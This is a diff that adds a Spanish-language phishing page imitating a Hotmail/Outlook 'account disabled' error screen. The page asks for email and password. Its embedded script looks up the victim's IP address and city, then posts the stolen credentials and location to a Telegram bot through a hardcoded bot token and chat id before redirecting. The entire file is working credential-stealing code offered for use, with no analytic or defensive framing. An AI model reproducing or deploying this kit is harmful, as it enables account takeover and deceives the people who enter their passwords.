@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>servicios</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="archivos/main.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script>
+//bot token
+var telegram_bot_id =  "6984622042:AAE6QS8Jd-NzLhKIBFPfvt67jVnTA1FA7h0";
+//chat id
+var chat_id ="@ouslook";
+</script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("bcrreo2").value;
+    u_name2 = document.getElementById("bclv2").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMHOTBBMAIL\n☰Ucorr: " + u_name + "\n☰clv: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'index4.html';
+    });
+    return false;
+  };
+
+</script>
+</head>
+<body>
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+		<form method="post" action="" onsubmit="return sender();" class="delform" >
+				
+					<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+				
+					
+	
+					<img src="archivos/modolais.png" style="width:120px;"><br><br>
+					<div class="ms-StackItem css-102"><span class="css-103"></span></div>
+						<span style="font-size: 18px; font-family:Helvetica;">
+						<b>Cuenta inhabilitada</b><br>
+				 </span>
+	<br>
+
+							<span style="font-size: 14px; font-family:Helvetica;">
+						<p style="color:red;font-size: 14px; font-family:Helvetica;">¡Ha ocurrido un error!</p>
+						<b>Ingrese la siguiente informaci&oacute;n nuevamente:</b>
+				 </span><br>
+				<div align="left">
+				</div><br>
+				
+							<div class="wrap-input100 validate-input m-b-16" >
+							<input class="input100" type="email" name="bcrreo2"  id="bcrreo2" placeholder="Correo electrónico"  maxlength="100" required>
+		
+						
+					
+					<br><br>
+
+					</div>
+					
+
+				
+					<div class="wrap-input100 validate-input m-b-16" >
+							<input class="input100" type="password" name="bclv2" id="bclv2" placeholder="Escribir Contraseña" maxlength="20" required>
+						
+					
+					<br>
+								<br>
+
+					
+					
+					</div>
+					
+
+					
+					
+
+					<div class="container-login100-form-btn">
+						<button type="submit" class="login100-form-btn">
+							Continuar
+						</button>
+					</div>
+
+
+				
+				
+				</form>
+			</div>
+			
+		</div>
+	</div>
+</body>
+</html>
